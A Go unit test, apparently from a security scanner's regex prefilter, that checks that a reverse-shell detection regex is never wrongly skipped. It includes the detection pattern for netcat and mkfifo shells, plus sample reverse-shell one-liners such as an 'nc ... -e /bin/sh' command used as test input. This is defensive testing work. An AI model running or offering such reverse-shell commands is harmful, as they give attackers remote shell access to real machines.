// Copyright 2026 Cisco Systems, Inc. and its affiliates
// SPDX-License-Identifier: Apache-2.0

package rxprefilter

import (
	"math/rand/v2"
	"regexp"
	"strings"
	"testing"
)

// TestGAP0299FactoredAlternationKeepsItsPrefix: a literal run that a
// factored alternation continues (nc|ncat|netcat parses as
// n(?:c(?:at)?|etcat)) is a required literal of each branch, so a text with
// no "nc" and no "netcat" skips the reverse-shell regex (rel-1-0-10:GAP-0299),
// and every text the regex matches is still checked.
func TestGAP0299FactoredAlternationKeepsItsPrefix(t *testing.T) {
	revshell := regexp.MustCompile(`(?i)(?:\b(?:nc|ncat|netcat)\b\s+(?:(?:-[a-zA-Z]*\s+)*\S+\s+\d+\s*(?:-e|--exec)\b|(?:-[a-zA-Z]*\s+)*(?:-e|--exec)\s+\S+\s+\S+\s+\d+\b)|\bmkfifo\b[^;\r\n]{1,256};[^|\r\n]{1,512}\|\s*(?:nc|ncat|netcat)\b[^;\r\n]{1,256}>\s*/(?:tmp|var/tmp|dev/shm)/)`)
	var benign strings.Builder
	for i := 0; benign.Len() < 1<<16; i++ {
		benign.WriteString("benign note line 12: nothing to see here\n")
	}
	if MayMatch(revshell, benign.String()) {
		t.Fatal("the reverse-shell regex was not skipped on a text with no nc, ncat, netcat or mkfifo")
	}
	for _, attack := range []string{"nc 10.0.0.1 4444 -e /bin/sh", "NCAT -e /bin/sh h 4444", "NetCat x 1 --exec",
		"mkfifo /tmp/f; cat /tmp/f | nc h 1 > /tmp/f"} {
		text := benign.String() + attack + "\n" + benign.String()
		if !revshell.MatchString(text) || !MayMatch(revshell, text) {
			t.Fatalf("%q: match %v, MayMatch %v", attack, revshell.MatchString(text), MayMatch(revshell, text))
		}
	}
	// Oracle: random factored alternations and texts; a text the regex
	// matches is never skipped.
	rng := rand.New(rand.NewPCG(3, 299))
	parts := []string{"n", "c", "at", "e", "tc", "x", "N", "C", "AT", "-", "ſ", "K", "k", "K"}
	word := func(n int) string {
		var b strings.Builder
		for range n {
			b.WriteString(parts[rng.IntN(len(parts))])
		}
		return b.String()
	}
	filler := strings.Repeat("filler words only here\n", MinText/20)
	for i := 0; i < 600; i++ {
		var alts []string
		prefix := word(1 + rng.IntN(2))
		for n := 1 + rng.IntN(4); n > 0; n-- {
			alts = append(alts, regexp.QuoteMeta(prefix+word(rng.IntN(3))))
		}
		flags := []string{"", "(?i)"}[rng.IntN(2)]
		pattern := flags + `\b(?:` + strings.Join(alts, "|") + `)\b\s*` + regexp.QuoteMeta(word(rng.IntN(2)))
		re, err := regexp.Compile(pattern)
		if err != nil {
			continue
		}
		for j := 0; j < 10; j++ {
			lead := ""
			if j%2 == 0 {
				lead = prefix
			}
			text := filler + lead + word(rng.IntN(6)) + " " + word(rng.IntN(4)) + filler
			if re.MatchString(text) && !MayMatch(re, text) {
				t.Fatalf("%q skipped a text it matches: %q", pattern, strings.TrimSpace(strings.ReplaceAll(text, filler, "")))
			}
		}
	}
}
